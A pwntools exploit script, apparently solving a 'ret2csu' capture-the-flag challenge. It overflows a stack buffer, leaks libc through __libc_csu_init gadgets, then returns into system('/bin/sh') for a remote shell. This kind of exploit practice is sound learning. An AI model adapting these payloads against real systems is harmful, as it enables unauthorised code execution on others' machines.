from pwn import *

context(arch = 'amd64',log_level = 'debug')
elf = ELF("./ret2csu")
libc = ELF("./libc.so.6")
#p = process("./ret2csu")
p = remote(...)

write_got = elf.got['write']
read_got = elf.got['read']
main_addr = 0x4011DC
bss_addr = elf.bss()
csu1_addr = 0x4012A6
csu2_addr = 0x401290
pop_rdi = 0x4012b3
ret_addr = 0x40101A

payload = b'A'*0x108 + p64(csu1_addr) + p64(0) #rsp+8
payload += p64(0) +  p64(1) + p64(1) #rbx=0、rbp=1（防jump）、r12=1
payload += p64(write_got) + p64(8) + p64(write_got) #相当于调用write（ 1,write_got,8)
payload += p64(csu2_addr) + b'a'*0x38 + p64(main_addr) #栈填充（pop）+返回到main

p.recvuntil("Input:\n")
p.send(payload)
p.recvuntil("Ok.\n")

write_addr = u64(p.recv(6).ljust(8,b'\x00'))
success(f"write = {hex(write_addr)}")

libc_base = write_addr - libc.sym['write']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A'*0x108 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)

p.recvuntil("Input:\n")
p.send(payload2)
p.recvuntil("Ok.\n")

p.interactive()
